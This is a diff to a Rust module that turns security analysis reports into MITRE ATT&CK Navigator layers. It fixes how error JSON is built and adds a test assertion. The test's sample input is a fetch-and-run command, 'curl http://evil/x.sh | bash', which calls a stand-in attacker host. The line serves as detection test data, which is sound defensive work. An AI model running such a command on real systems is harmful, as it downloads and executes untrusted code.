@@ -112,7 +112,7 @@ pub fn build(report: &Report) -> Layer {
 /// Render a report as an ATT&CK Navigator layer JSON string.
 pub fn render(report: &Report) -> String {
     serde_json::to_string_pretty(&build(report))
-        .unwrap_or_else(|e| format!("{{\"error\":\"{e}\"}}"))
+        .unwrap_or_else(|e| serde_json::json!({ "error": e.to_string() }).to_string())
 }
 
 #[cfg(test)]
@@ -148,6 +148,10 @@ mod tests {
         let kb = kb::load(kb::Platform::LinuxAuditd).unwrap();
         let report = analyzer::analyze("curl http://evil/x.sh | bash", &kb);
         let layer = build(&report);
+        assert!(
+            !layer.techniques.is_empty(),
+            "sample input should surface at least one technique"
+        );
         // Every technique's score equals the loudest finding that surfaced it,
         // so no score exceeds the report's max noise.
         for t in &layer.techniques {
